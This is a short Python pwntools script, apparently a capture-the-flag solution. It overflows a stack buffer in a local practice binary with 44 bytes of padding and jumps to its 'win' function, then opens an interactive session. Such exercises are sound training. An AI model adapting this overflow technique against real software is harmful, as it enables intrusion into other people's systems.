#!/usr/bin/env python3

from pwn import *

binary = args.BIN

e = context.binary = ELF(binary)
#r = ROP(e)

context.terminal = ["tmux", "splitw", "-h"]

gs = '''
continue
'''

def start():
    if args.DEBUG:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

p = start()

print('{:08x}'.format(e.sym['win']))
#print(e.sym)

padding = b'A' * 44
retn = flat(e.sym['win'])

buffer = padding + retn

print(retn, buffer)

def exploit():
    p.sendline(buffer)

exploit()

p.interactive()
#p.close()
